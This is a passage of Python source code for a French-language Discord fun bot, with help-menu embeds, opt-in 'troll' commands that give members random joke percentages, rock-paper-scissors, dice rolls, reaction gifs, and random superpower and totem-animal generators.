            new_embed.add_field(name="👶 +enfant @user @user", value="Crée un enfant aléatoire entre deux utilisateurs !\n*Mélangez les pseudos et les photos de profil des deux utilisateurs pour créer un bébé unique. C'est fun et surprenant !*", inline=False)
            new_embed.add_field(name="🍬 +sucre", value="Affiche le **taux de glycémie** du membre ciblé 🍭.\n*Utile pour suivre les niveaux de sucre des membres du serveur de manière ludique.*", inline=False)
            new_embed.set_footer(text="♥️ by Iseyg")
        elif category == "Crédits":
            new_embed.title = "💖 **Crédits et Remerciements**"
            new_embed.description = """
            Un immense merci à **Iseyg** pour le développement de ce bot incroyable ! 🙏  
            Sans lui, ce bot ne serait rien de plus qu'un concept. Grâce à sa passion, son travail acharné et ses compétences exceptionnelles, ce projet a pris vie et continue de grandir chaque jour. 🚀

            Nous tenons également à exprimer notre gratitude envers **toute la communauté**. 💙  
            Votre soutien constant, vos retours et vos idées font de ce bot ce qu'il est aujourd'hui. Chacun de vous, que ce soit par vos suggestions, vos contributions ou même simplement en utilisant le bot, fait une différence. 

            Merci à **tous les développeurs, contributeurs et membres** qui ont aidé à faire évoluer ce projet et l’ont enrichi avec leurs talents et leurs efforts. 🙌

            Et bien sûr, un grand merci à vous, **utilisateurs**, pour votre enthousiasme et votre confiance. Vous êtes la raison pour laquelle ce bot continue d’évoluer. 🌟

            Restons unis et continuons à faire grandir cette aventure ensemble ! 🌍
            """
            new_embed.set_footer(text="♥️ by Iseyg")

        await interaction.response.edit_message(embed=new_embed)

    select.callback = on_select  # Attacher la fonction de callback à l'élément select

    # Afficher le message avec le menu déroulant
    view = discord.ui.View()
    view.add_item(select)
    
    await ctx.send(embed=embed, view=view)
#------------------------------------------------------------------------- Commandes Fun : Flemme de tout lister

# Commande troll vérifiant si le serveur a troll activé
@bot.command()
async def gay(ctx, member: discord.Member = None):
    guild_id = ctx.guild.id

    # Vérifie si le troll est activé pour ce serveur
    troll_data = collection27.find_one({"guild_id": guild_id, "troll_active": True})
    if not troll_data:
        await ctx.send("❌ Les commandes troll ne sont **pas activées** sur ce serveur. Utilisez `/activate-troll` pour les activer.")
        return

    if member is None:
        await ctx.send("Vous n'avez ciblé personne !")
        return

    percentage = random.randint(0, 100)

    embed = discord.Embed(
        title="Analyse de gayitude 🌈",
        description=f"{member.mention} est gay à **{percentage}%** !\n\n*Le pourcentage varie en fonction des pulsions du membre.*",
        color=discord.Color.purple()
    )
    embed.set_thumbnail(url=member.avatar.url)
    embed.set_footer(text=f"Commandé par {ctx.author.name} ♥️by Iseyg", icon_url=ctx.author.avatar.url)

    await ctx.send(embed=embed)

# Commande troll vérifiant si le serveur a troll activé
@bot.command()
async def singe(ctx, member: discord.Member = None):
    guild_id = ctx.guild.id

    # Vérifie si le troll est activé pour ce serveur
    troll_data = collection27.find_one({"guild_id": guild_id, "troll_active": True})
    if not troll_data:
        await ctx.send("❌ Les commandes troll ne sont **pas activées** sur ce serveur. Utilisez `/activate-troll` pour les activer.")
        return

    if member is None:
        await ctx.send("Vous n'avez ciblé personne !")
        return

    percentage = random.randint(0, 100)

    embed = discord.Embed(
        title="Analyse de singe 🐒",
        description=f"{member.mention} est un singe à **{percentage}%** !\n\n*Le pourcentage varie en fonction de l'énergie primate du membre.*",
        color=discord.Color.green()
    )
    embed.set_thumbnail(url=member.avatar.url)
    embed.set_footer(text=f"Commandé par {ctx.author.name} 🐵 by Isey", icon_url=ctx.author.avatar.url)

    await ctx.send(embed=embed)

# Commande troll vérifiant si le serveur a troll activé
@bot.command()
async def racist(ctx, member: discord.Member = None):
    guild_id = ctx.guild.id

    # Vérifie si le troll est activé pour ce serveur
    troll_data = collection27.find_one({"guild_id": guild_id, "troll_active": True})
    if not troll_data:
        await ctx.send("❌ Les commandes troll ne sont **pas activées** sur ce serveur. Utilisez `/activate-troll` pour les activer.")
        return

    if member is None:
        await ctx.send("Vous n'avez ciblé personne !")
        return

    percentage = random.randint(0, 100)

    embed = discord.Embed(
        title="Analyse de racisme 🪄",
        description=f"{member.mention} est raciste à **{percentage}%** !\n\n*Le pourcentage varie en fonction des pulsions du membre.*",
        color=discord.Color.purple()
    )
    embed.set_thumbnail(url=member.avatar.url)
    embed.set_footer(text=f"Commandé par {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)

    await ctx.send(embed=embed)

# Commande troll vérifiant si le serveur a troll activé
@bot.command()
async def sucre(ctx, member: discord.Member = None):
    guild_id = ctx.guild.id

    # Vérifie si le troll est activé pour ce serveur
    troll_data = collection27.find_one({"guild_id": guild_id, "troll_active": True})
    if not troll_data:
        await ctx.send("❌ Les commandes troll ne sont **pas activées** sur ce serveur. Utilisez `/activate-troll` pour les activer.")
        return

    if member is None:
        await ctx.send("Vous n'avez ciblé personne !")
        return

    percentage = random.randint(0, 100)

    embed = discord.Embed(
        title="Analyse de l'indice glycémique 🍬",
        description=f"L'indice glycémique de {member.mention} est de **{percentage}%** !\n\n*Le pourcentage varie en fonction des habitudes alimentaires de la personne.*",
        color=discord.Color.green()
    )
    embed.set_thumbnail(url=member.avatar.url)
    embed.set_footer(text=f"Commandé par {ctx.author.name} 🍏by Iseyg", icon_url=ctx.author.avatar.url)

    await ctx.send(embed=embed)

@bot.command()
async def rat(ctx, member: discord.Member = None):
    # Vérification si la commande troll est activée
    guild_id = ctx.guild.id

    # Vérifie si le troll est activé pour ce serveur
    troll_data = collection27.find_one({"guild_id": guild_id, "troll_active": True})
    if not troll_data:
        await ctx.send("❌ Les commandes troll ne sont **pas activées** sur ce serveur. Utilisez `/activate-troll` pour les activer.")
        return
    
    if member is None:
        await ctx.send("Vous n'avez ciblé personne !")
        return
    
    percentage = random.randint(0, 100)
    
    embed = discord.Embed(
        title=f"Analyse de radinerie 🐁", 
        description=f"{member.mention} est un rat à **{percentage}%** !\n\n*Le pourcentage varie en fonction des actes du membre.*", 
        color=discord.Color.purple()
    )
    embed.set_thumbnail(url=member.avatar.url)
    embed.set_footer(text=f"Commandé par {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)
    
    await ctx.send(embed=embed)

@bot.command()
async def con(ctx, member: discord.Member = None):
    # Vérification si la commande troll est activée
    guild_id = ctx.guild.id

    # Vérifie si le troll est activé pour ce serveur
    troll_data = collection27.find_one({"guild_id": guild_id, "troll_active": True})
    if not troll_data:
        await ctx.send("❌ Les commandes troll ne sont **pas activées** sur ce serveur. Utilisez `/activate-troll` pour les activer.")
        return
    
    if member is None:
        await ctx.send("Vous n'avez ciblé personne !")
        return
    
    percentage = random.randint(0, 100)
    
    embed = discord.Embed(
        title="Analyse de connerie 🤡",
        description=f"{member.mention} est con à **{percentage}%** !\n\n*Le pourcentage varie en fonction des neurones actifs du membre.*",
        color=discord.Color.red()
    )
    embed.set_thumbnail(url=member.avatar.url)
    embed.set_footer(text=f"Commandé par {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)
    
    await ctx.send(embed=embed)

@bot.command()
async def libido(ctx, member: discord.Member = None):
    # Vérification si la commande troll est activée
    guild_id = ctx.guild.id

    # Vérifie si le troll est activé pour ce serveur
    troll_data = collection27.find_one({"guild_id": guild_id, "troll_active": True})
    if not troll_data:
        await ctx.send("❌ Les commandes troll ne sont **pas activées** sur ce serveur. Utilisez `/activate-troll` pour les activer.")
        return
    
    if member is None:
        await ctx.send("Vous n'avez ciblé personne !")
        return
    
    percentage = random.randint(0, 100)
    
    embed = discord.Embed(
        title="Analyse de libido 🔥",
        description=f"{member.mention} a une libido à **{percentage}%** !\n\n*Le pourcentage varie en fonction de l'humeur et du climat.*",
        color=discord.Color.red()
    )
    embed.set_thumbnail(url=member.avatar.url)
    embed.set_footer(text=f"Commandé par {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)
    
    await ctx.send(embed=embed)
    
@bot.command()
async def zizi(ctx, member: discord.Member = None):
    # Vérification si la commande troll est activée
    guild_id = ctx.guild.id

    # Vérifie si le troll est activé pour ce serveur
    troll_data = collection27.find_one({"guild_id": guild_id, "troll_active": True})
    if not troll_data:
        await ctx.send("❌ Les commandes troll ne sont **pas activées** sur ce serveur. Utilisez `/activate-troll` pour les activer.")
        return
    
    if member is None:
        await ctx.send("Vous n'avez ciblé personne !")
        return
    
    # Générer une valeur aléatoire entre 0 et 50 cm
    value = random.randint(0, 50)

    # Créer l'embed
    embed = discord.Embed(
        title="Analyse de la taille du zizi 🔥", 
        description=f"{member.mention} a un zizi de **{value} cm** !\n\n*La taille varie selon l'humeur du membre.*", 
        color=discord.Color.blue()
    )
    embed.set_thumbnail(url=member.avatar.url)
    embed.set_footer(text=f"Commandé par {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)

    # Envoyer l'embed
    await ctx.send(embed=embed)

@bot.command()
async def fou(ctx, member: discord.Member = None):
    # Vérification si la commande troll est activée
    guild_id = ctx.guild.id

    # Vérifie si le troll est activé pour ce serveur
    troll_data = collection27.find_one({"guild_id": guild_id, "troll_active": True})
    if not troll_data:
        await ctx.send("❌ Les commandes troll ne sont **pas activées** sur ce serveur. Utilisez `/activate-troll` pour les activer.")
        return
    
    if member is None:
        await ctx.send("Vous n'avez ciblé personne !")
        return
    
    percentage = random.randint(0, 100)
    
    embed = discord.Embed(
        title=f"Analyse de folie 🤪", 
        description=f"{member.mention} est fou à **{percentage}%** !\n\n*Le pourcentage varie en fonction de l'état mental du membre.*", 
        color=discord.Color.green()
    )
    embed.set_thumbnail(url=member.avatar.url)
    embed.set_footer(text=f"Commandé par {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)
    
    await ctx.send(embed=embed)

@bot.command()
async def testo(ctx, member: discord.Member = None):
    guild_id = ctx.guild.id

    # Vérifie si le troll est activé pour ce serveur
    troll_data = collection27.find_one({"guild_id": guild_id, "troll_active": True})
    if not troll_data:
        await ctx.send("❌ Les commandes troll ne sont **pas activées** sur ce serveur. Utilisez `/activate-troll` pour les activer.")
        return
    
    if member is None:
        await ctx.send("Vous n'avez ciblé personne !")
        return
    
    percentage = random.randint(0, 100)
    
    embed = discord.Embed(
        title=f"Analyse de testostérone 💪", 
        description=f"{member.mention} a un taux de testostérone de **{percentage}%** !\n\n*Le pourcentage varie en fonction des niveaux de virilité du membre.*", 
        color=discord.Color.blue()
    )
    embed.set_thumbnail(url=member.avatar.url)
    embed.set_footer(text=f"Commandé par {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)
    
    await ctx.send(embed=embed)

class PFCView(View):
    def __init__(self, player1, player2):
        super().__init__(timeout=60)
        self.choices = {}
        self.player1 = player1
        self.player2 = player2
        
        for choice in ['Pierre', 'Feuille', 'Ciseau']:
            self.add_item(PFCButton(choice, self))

    async def check_winner(self):
        if len(self.choices) == 2:
            p1_choice = self.choices[self.player1]
            p2_choice = self.choices[self.player2]
            result = determine_winner(p1_choice, p2_choice)
            
            winner_text = {
                'win': f"{self.player1.mention} a gagné !",
                'lose': f"{self.player2.mention} a gagné !",
                'draw': "Match nul !"
            }
            
            embed = discord.Embed(title="Résultat du Pierre-Feuille-Ciseaux !", description=f"{self.player1.mention} a choisi **{p1_choice}**\n{self.player2.mention} a choisi **{p2_choice}**\n\n{winner_text[result]}", color=0x00FF00)
            await self.player1.send(embed=embed)
            await self.player2.send(embed=embed)
            await self.message.edit(embed=embed, view=None)

class PFCButton(Button):
    def __init__(self, choice, view):
        super().__init__(label=choice, style=discord.ButtonStyle.primary)
        self.choice = choice
        self.pfc_view = view
    
    async def callback(self, interaction: discord.Interaction):
        if interaction.user in [self.pfc_view.player1, self.pfc_view.player2]:
            if interaction.user not in self.pfc_view.choices:
                self.pfc_view.choices[interaction.user] = self.choice
                await interaction.response.send_message(f"{interaction.user.mention} a choisi **{self.choice}**", ephemeral=True)
                if len(self.pfc_view.choices) == 2:
                    await self.pfc_view.check_winner()
            else:
                await interaction.response.send_message("Tu as déjà choisi !", ephemeral=True)
        else:
            await interaction.response.send_message("Tu ne participes pas à cette partie !", ephemeral=True)

def determine_winner(choice1, choice2):
    beats = {"Pierre": "Ciseau", "Ciseau": "Feuille", "Feuille": "Pierre"}
    if choice1 == choice2:
        return "draw"
    elif beats[choice1] == choice2:
        return "win"
    else:
        return "lose"

class AcceptView(View):
    def __init__(self, ctx, player1, player2):
        super().__init__(timeout=30)
        self.ctx = ctx
        self.player1 = player1
        self.player2 = player2

        self.add_item(AcceptButton("✅ Accepter", discord.ButtonStyle.success, True, self))
        self.add_item(AcceptButton("❌ Refuser", discord.ButtonStyle.danger, False, self))

class AcceptButton(Button):
    def __init__(self, label, style, accept, view):
        super().__init__(label=label, style=style)
        self.accept = accept
        self.accept_view = view
    
    async def callback(self, interaction: discord.Interaction):
        if interaction.user != self.accept_view.player2:
            return await interaction.response.send_message("Ce n'est pas à toi d'accepter ou refuser !", ephemeral=True)
        
        if self.accept:
            embed = discord.Embed(title="Pierre-Feuille-Ciseaux", description=f"{self.accept_view.player1.mention} VS {self.accept_view.player2.mention}\n\nCliquez sur votre choix !", color=0x00FF00)
            await interaction.message.edit(embed=embed, view=PFCView(self.accept_view.player1, self.accept_view.player2))
        else:
            await interaction.message.edit(content=f"Le +pfc a été refusé par {self.accept_view.player2.mention}", embed=None, view=None)

@bot.command()
async def pfc(ctx, member: discord.Member = None):
    if not member:
        return await ctx.send("Vous devez mentionner un adversaire pour jouer !")
    if member == ctx.author:
        return await ctx.send("Vous ne pouvez pas jouer contre vous-même !")
    
    embed = discord.Embed(title="Défi Pierre-Feuille-Ciseaux", description=f"{member.mention}, acceptes-tu le défi de {ctx.author.mention} ?", color=0xFFA500)
    await ctx.send(embed=embed, view=AcceptView(ctx, ctx.author, member))

@bot.command()
async def gunfight(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send('Erreur : vous devez cibler un membre !')
        return

    if member == ctx.author:
        await ctx.send('Vous ne pouvez pas vous défier vous-même !')
        return

    # Création des boutons
    accept_button = Button(label="Oui", style=discord.ButtonStyle.green)
    decline_button = Button(label="Non", style=discord.ButtonStyle.red)

    # Définir les actions des boutons
    async def accept(interaction):
        if interaction.user != member:
            await interaction.response.send_message('Ce n\'est pas votre duel !', ephemeral=True)
            return
        result = random.choice([ctx.author, member])
        winner = result.name
        await interaction.message.edit(content=f"{member.mention} a accepté le duel ! Le gagnant est {winner} !", view=None)
    
    async def decline(interaction):
        if interaction.user != member:
            await interaction.response.send_message('Ce n\'est pas votre duel !', ephemeral=True)
            return
        await interaction.message.edit(content=f"{member.mention} a refusé le duel.", view=None)

    accept_button.callback = accept
    decline_button.callback = decline

    # Création de la vue avec les boutons
    view = View()
    view.add_item(accept_button)
    view.add_item(decline_button)

    # Envoyer l'embed pour le défi
    embed = discord.Embed(
        title="Défi de Gunfight",
        description=f"{ctx.author.mention} vous défie à un duel, {member.mention}. Acceptez-vous ?",
        color=discord.Color.blue()
    )
    await ctx.send(embed=embed, view=view)
    
@bot.command()
async def hug(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("Vous n'avez ciblé personne !")
        return

    # Créer l'embed
    embed = discord.Embed(
        title=f"Tu as donné un câlin à {member.name} ! 🤗",  # Utilisation de member.name pour afficher le nom simple
        description="Les câlins sont la meilleure chose au monde !",
        color=discord.Color.blue()
    )
    embed.set_image(url="https://media.tenor.com/P6FsFii7pnoAAAAM/hug-warm-hug.gif")
    embed.set_thumbnail(url=member.avatar.url)
    embed.set_footer(text=f"Commandé par {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)
    await ctx.send(embed=embed)


@bot.command()
async def slap(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("Vous n'avez ciblé personne !")
        return

    # Créer l'embed
    embed = discord.Embed(
        title=f"Tu as giflé {member.name} !",  # Utilisation de member.name
        description="Oups, ça a dû faire mal 😱",
        color=discord.Color.red()
    )
    embed.set_image(url="https://media.tenor.com/QRdCcNbk18MAAAAM/slap.gif")
    embed.set_thumbnail(url=member.avatar.url)
    embed.set_footer(text=f"Commandé par {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)
    await ctx.send(embed=embed)


@bot.command()
async def dance(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("Vous n'avez ciblé personne !")
        return

    # Créer l'embed
    embed = discord.Embed(
        title=f"{member.name} danse comme un pro ! 💃🕺",  # Utilisation de member.name
        description="Admirez cette danse épique !",
        color=discord.Color.green()
    )
    embed.set_image(url="https://media.tenor.com/d7ibtS6MLQgAAAAM/dancing-kid.gif")
    embed.set_thumbnail(url=member.avatar.url)
    embed.set_footer(text=f"Commandé par {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)
    await ctx.send(embed=embed)


@bot.command()
async def flirt(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("Vous n'avez ciblé personne !")
        return

    # Créer l'embed
    embed = discord.Embed(
        title=f"Vous avez charmé {member.name} avec un sourire éclatant ! 😍",  # Utilisation de member.name
        description="Vous êtes irrésistible !",
        color=discord.Color.purple()
    )
    embed.set_image(url="https://media.tenor.com/HDdV-0Km1QAAAAAM/hello-sugar.gif")
    embed.set_thumbnail(url=member.avatar.url)
    embed.set_footer(text=f"Commandé par {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)
    await ctx.send(embed=embed)


@bot.command()
async def whisper(ctx, member: discord.Member = None, *, message):
    if member is None:
        await ctx.send("Vous n'avez ciblé personne !")
        return

    # Créer l'embed
    embed = discord.Embed(
        title=f"Chuchotement de {ctx.author.name} à {member.name}",  # Utilisation de member.name et ctx.author.name
        description=f"*{message}*",
        color=discord.Color.greyple()
    )
    embed.set_footer(text=f"Un message secret entre vous deux... {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)
    embed.set_thumbnail(url=member.avatar.url)
    await ctx.send(embed=embed)

@bot.command()
async def troll(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("Vous n'avez ciblé personne !")
        return

    # Créer l'embed
    embed = discord.Embed(
        title=f"Tu as trollé {member.name} ! 😆",  # Utilisation de member.name
        description=f"Oups, {member.name} s'est fait avoir !",
        color=discord.Color.orange()
    )
    embed.set_image(url="https://media.tenor.com/7Q8TRpW2ZXkAAAAM/yeet-lol.gif")
    embed.set_thumbnail(url=member.avatar.url)
    embed.set_footer(text=f"Commandé par {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)
    await ctx.send(embed=embed)

@bot.command()
async def kiss(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("Vous n'avez ciblé personne !")
        return

    # Créer l'embed
    embed = discord.Embed(
        title=f"Tu as embrassé {member.name} !",  # Utilisation de member.name
        description="Un doux baiser 💋",  
        color=discord.Color.pink()
    )
    embed.set_image(url="https://media.tenor.com/3DHc1_2PZ-oAAAAM/kiss.gif")
    embed.set_thumbnail(url=member.avatar.url)
    embed.set_footer(text=f"Commandé par {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)
    await ctx.send(embed=embed)

@bot.command()
async def kill(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("Vous n'avez ciblé personne !")
        return

    # Créer l'embed
    embed = discord.Embed(
        title=f"Tu as tué {member.name} !",  # Utilisation de member.name
        description="C'est la fin pour lui... 💀",  
        color=discord.Color.red()
    )
    embed.set_image(url="https://media1.tenor.com/m/4hO2HfS9fcMAAAAd/toaru-index.gif")
    embed.set_thumbnail(url=member.avatar.url)
    embed.set_footer(text=f"Commandé par {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)
    await ctx.send(embed=embed)

@bot.command()
async def love(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("Tu n'as pas mentionné de membre ! Utilise +love @membre.")
        return
    
    love_percentage = random.randint(0, 100)
    
    embed = discord.Embed(
        title="L'Amour Etheryen",
        description=f"L'amour entre {ctx.author.mention} et {member.mention} est de **{love_percentage}%** !",
        color=discord.Color.red() if love_percentage > 50 else discord.Color.blue()
    )
    embed.set_footer(text=f"Commandé par {ctx.author.name} | ♥️by Iseyg", icon_url=ctx.author.avatar.url)
    
    # Image en grand
    embed.set_image(url="https://media.istockphoto.com/id/636379014/fr/photo/mains-formant-une-forme-de-c%C5%93ur-avec-sa-silhouette-au-coucher-du-soleil.jpg?s=612x612&w=0&k=20&c=x9tv_eEIyf5eBbNKJ4L8Nte2LE-UUh6YXVtr29ubwRk=")

    await ctx.send(embed=embed)

@bot.command()
async def reverse(ctx, *, text: str = None):
    if text is None:
        await ctx.send("Tu n'as pas fourni de texte à inverser !")
        return

    reversed_text = text[::-1]  # Inverser le texte
    await ctx.send(f"Texte inversé : {reversed_text}")

@bot.command()
async def note(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("Tu n'as pas précisé l'utilisateur !")
        return

    # Générer une note aléatoire entre 1 et 10
    note = random.randint(1, 10)

    # Créer l'embed
    embed = discord.Embed(
        title=f"{member.name} a reçu une note !",
        description=f"Note : {note}/10",
        color=discord.Color.green()
    )
    embed.set_thumbnail(url=member.avatar.url)
    embed.set_footer(text=f"Commandé par {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)
    await ctx.send(embed=embed)

@bot.command()
async def say(ctx, *, text: str = None):
    # Vérifie si l'utilisateur a les permissions d'admin ou si son ID correspond à ISEY_ID
    if not ctx.author.guild_permissions.administrator and str(ctx.author.id) != "792755123587645461":
        await ctx.send("Tu n'as pas les permissions nécessaires pour utiliser cette commande.")
        return
    
    if text is None:
        await ctx.send("Tu n'as pas écrit de texte à dire !")
        return

    # Supprime le message originel
    await ctx.message.delete()

    # Envoie le texte spécifié
    await ctx.send(text)

@bot.command()
async def coinflip(ctx):
    import random
    result = random.choice(["Pile", "Face"])
    await ctx.send(f"Résultat du coinflip : {result}")


@bot.command()
async def dice(ctx):
    import random
    result = random.randint(1, 6)
    await ctx.send(f"Résultat du dé : {result}")


@bot.command()
async def fight(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("Tu n'as ciblé personne pour te battre !")
        return

    # Simuler un combat
    import random
    result = random.choice([f"{ctx.author.name} a gagné !", f"{member.name} a gagné !", "C'est une égalité !"])

    # Créer l'embed
    embed = discord.Embed(
        title=f"Combat entre {ctx.author.name} et {member.name}",
        description=result,
        color=discord.Color.blue()
    )
    embed.set_thumbnail(url=member.avatar.url)
    embed.set_footer(text=f"Commandé par {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)
    await ctx.send(embed=embed)

# Définir la commande +roll
@bot.command()
async def roll(ctx, x: str = None):
    # Vérifier si x est bien précisé
    if x is None:
        embed = discord.Embed(
            title="Erreur",
            description="Vous n'avez pas précisé de chiffre entre 1 et 500.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    try:
        # Convertir x en entier
        x = int(x)
    except ValueError:
        embed = discord.Embed(
            title="Erreur",
            description="Le chiffre doit être un nombre entier.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Vérifier si x est dans les bonnes limites
    if x < 1 or x > 500:
        embed = discord.Embed(
            title="Erreur",
            description="Le chiffre doit être compris entre 1 et 500.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Générer un nombre aléatoire entre 1 et x
    result = random.randint(1, x)

    # Créer l'embed de la réponse
    embed = discord.Embed(
        title="🎲 Résultat du tirage",
        description=f"Le nombre tiré au hasard entre 1 et {x} est : **{result}**",
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)

@bot.command()
async def enfant(ctx, parent1: discord.Member = None, parent2: discord.Member = None):
    if not parent1 or not parent2:
        await ctx.send("Tu dois mentionner deux membres ! Utilise `/enfant @membre1 @membre2`.")
        return
    
    # Génération du prénom en combinant les pseudos
    prenom = parent1.name[:len(parent1.name)//2] + parent2.name[len(parent2.name)//2:]
    
    # Création de l'embed
    embed = discord.Embed(
        title="👶 Voici votre enfant !",
        description=f"{parent1.mention} + {parent2.mention} = **{prenom}** 🍼",
        color=discord.Color.purple()
    )
    embed.set_footer(text=f"Prenez soin de votre bébé ! {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)
    
    # Ajout des photos de profil
    embed.set_thumbnail(url=parent1.avatar.url if parent1.avatar else parent2.avatar.url)
    
    await ctx.send(embed=embed)

@bot.command()
async def superpouvoir(ctx, user: discord.Member = None):
    if not user:
        user = ctx.author  # Si pas d’utilisateur mentionné, prendre l’auteur

    pouvoirs = [
        "Téléportation instantanée 🌀 - Peut se déplacer n'importe où en un clin d'œil.",
        "Contrôle du feu 🔥 - Rien ne lui résiste… sauf l'eau.",
        "Super vitesse ⚡ - Peut courir plus vite qu'un TGV, mais oublie souvent où il va.",
        "Lecture des pensées 🧠 - Peut lire dans les esprits… sauf ceux qui ne pensent à rien.",
        "Invisibilité 🫥 - Peut disparaître… mais oublie que ses vêtements restent visibles.",
        "parler aux animaux 🦜 - Mais ils n'ont pas grand-chose d'intéressant à dire.",
        "Super force 💪 - Peut soulever une voiture, mais galère à ouvrir un pot de cornichons.",
        "Métamorphose 🦎 - Peut se transformer en n'importe quoi… mais pas revenir en humain.",
        "Chance infinie 🍀 - Gagne à tous les jeux… sauf au Uno.",
        "Création de portails 🌌 - Peut ouvrir des portails… mais ne sait jamais où ils mènent.",
        "Régénération 🩸 - Guérit instantanément… mais reste chatouilleux à vie.",
        "Capacité de voler 🕊️ - Mais uniquement à 10 cm du sol.",
        "Super charisme 😎 - Convainc tout le monde… sauf sa mère.",
        "Vision laser 🔥 - Brûle tout sur son passage… y compris ses propres chaussures.",
        "Invocation de clones 🧑‍🤝‍🧑 - Mais ils n’obéissent jamais.",
        "Télékinésie ✨ - Peut déplacer des objets… mais uniquement des plumes.",
        "Création de burgers 🍔 - Magique, mais toujours trop cuits ou trop crus.",
        "Respiration sous l'eau 🐠 - Mais panique dès qu'il voit une méduse.",
        "Contrôle de la gravité 🌍 - Peut voler, mais oublie souvent de redescendre.",
        "Capacité d’arrêter le temps ⏳ - Mais uniquement quand il dort.",
        "Voyage dans le temps ⏰ - Peut voyager dans le passé ou le futur… mais toujours à la mauvaise époque.",
        "Télépathie inversée 🧠 - Peut faire entendre ses pensées aux autres… mais ils ne peuvent jamais comprendre.",
        "Manipulation des rêves 🌙 - Peut entrer dans les rêves des gens… mais se retrouve toujours dans des cauchemars.",
        "Super mémoire 📚 - Se souvient de tout… sauf des choses qu’il vient de dire.",
        "Manipulation des ombres 🌑 - Peut faire bouger les ombres… mais ne peut jamais les arrêter.",
        "Création de pluie 🍃 - Peut faire pleuvoir… mais uniquement sur ses amis.",
        "Maîtrise des plantes 🌱 - Peut faire pousser des plantes à une vitesse folle… mais elles ne cessent de pousser partout.",
        "Contrôle des rêves éveillés 💤 - Peut contrôler ses rêves quand il est éveillé… mais se retrouve toujours dans une réunion ennuyante.",
        "Maîtrise de l’éclairage ✨ - Peut illuminer n'importe quelle pièce… mais oublie d’éteindre.",
        "Création de souvenirs 🧳 - Peut créer des souvenirs… mais ceux-ci sont toujours un peu bizarres.",
        "Changement de taille 📏 - Peut grandir ou rapetisser… mais n'arrive jamais à garder une taille stable.",
        "Vision nocturne 🌙 - Peut voir dans l’obscurité… mais tout est toujours en noir et blanc.",
        "Contrôle des éléments 🤹‍♂️ - Peut manipuler tous les éléments naturels… mais uniquement quand il pleut.",
        "Phasing à travers les murs 🚪 - Peut traverser les murs… mais parfois il traverse aussi les portes.",
        "Régénération de l’esprit 🧠 - Guérit les blessures mentales… mais les oublie instantanément après."


    ]

    pouvoir = random.choice(pouvoirs)

    embed = discord.Embed(
        title="⚡ Super-Pouvoir Débloqué !",
        description=f"{user.mention} possède le pouvoir de**{pouvoir}** !",
        color=discord.Color.purple()
    )
    embed.set_footer(text=f"Utilise-le avec sagesse... ou pas. {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)
    
    await ctx.send(embed=embed)

@bot.command()
async def totem(ctx, member: discord.Member = None):
    if not member:
        member = ctx.author  # Si pas de membre mentionné, prendre l'auteur  

    animaux_totem = {
        "Loup 🐺": "Fidèle et protecteur, il veille sur sa meute.",
        "Renard 🦊": "Rusé et malin, il trouve toujours un moyen de s'en sortir.",
        "Hibou 🦉": "Sage et observateur, il comprend tout avant les autres.",
        "Dragon 🐉": "Puissant et imposant, il ne laisse personne indifférent.",
        "Dauphin 🐬": "Joueur et intelligent, il adore embêter les autres.",
        "Chat 🐱": "Mystérieux et indépendant, il fait ce qu’il veut, quand il veut.",
        "Serpent 🐍": "Discret et patient, il attend le bon moment pour frapper.",
        "Corbeau 🦅": "Intelligent et un peu sinistre, il voit ce que les autres ignorent.",
        "Panda 🐼": "Calme et adorable… jusqu’à ce qu’on lui prenne son bambou.",
        "Tortue 🐢": "Lente mais sage, elle gagne toujours à la fin.",
        "Aigle 🦅": "Libre et fier, il vole au-dessus de tous les problèmes.",
        "Chauve-souris 🦇": "Préférant l'obscurité, elle voit clair quand tout le monde est perdu.",
        "Tigre 🐯": "Puissant et rapide, personne ne l’arrête.",
        "Lapin 🐰": "Rapide et malin, mais fuit dès qu’il y a un problème.",
        "Singe 🐵": "Curieux et joueur, il adore faire des bêtises.",
        "Escargot 🐌": "Lent… mais au moins il arrive toujours à destination.",
        "Pigeon 🕊️": "Increvable et partout à la fois, impossible de s'en débarrasser.",
        "Licorne 🦄": "Rare et magique, il apporte de la lumière partout où il passe.",
        "Poisson rouge 🐠": "Mémoire de 3 secondes, mais au moins il ne s’inquiète jamais.",
        "Canard 🦆": "Semble idiot, mais cache une intelligence surprenante.",
        "Raton laveur 🦝": "Petit voleur mignon qui adore piquer des trucs.",
        "Lynx 🐆" : "Serré dans ses mouvements, il frappe avec précision et discrétion.",
